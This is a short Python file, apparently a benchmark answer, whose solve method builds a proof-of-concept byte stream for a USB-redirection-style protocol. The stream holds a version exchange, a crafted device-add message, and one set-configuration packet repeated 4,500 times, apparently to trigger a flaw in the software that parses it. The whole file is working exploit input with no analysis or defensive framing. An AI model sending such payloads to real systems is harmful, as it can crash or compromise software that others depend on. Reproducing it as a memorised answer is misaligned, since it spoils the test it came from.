class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b""
        # Version exchange
        version_body = b"\x01\x00\x00\x00\x01\x00"
        version_len = len(version_body).to_bytes(4, "big")
        poc += version_len + version_body
        # Device add
        id_ = b"\x00\x00\x00\x00"
        dev_ver = b"\x00\x01\x00\x00"
        cls = b"\xff\x00\x00\x00"
        sub = b"\x00\x00\x00\x00"
        proto = b"\x00\x00\x00\x00"
        vid = b"\x34\x12\x00\x00"
        pid = b"\x78\x56\x00\x00"
        num_conf = b"\x01\x00\x00\x00"
        strings_size = b"\x00\x00\x00\x00"
        config_desc = b"\x09\x02\x12\x00\x01\x01\x00\x80\x32\x09\x04\x00\x00\x01\xff\x00\x00\x00"
        data = id_ + dev_ver + cls + sub + proto + vid + pid + num_conf + strings_size + config_desc
        add_body = b"\x03\x00" + data
        add_len = len(add_body).to_bytes(4, "big")
        poc += add_len + add_body
        # Many set configuration messages
        conf_body = b"\x06\x00\x00\x00\x00\x00\x01"
        conf_len = len(conf_body).to_bytes(4, "big")
        conf_packet = conf_len + conf_body
        N = 4500
        poc += conf_packet * N
        return poc
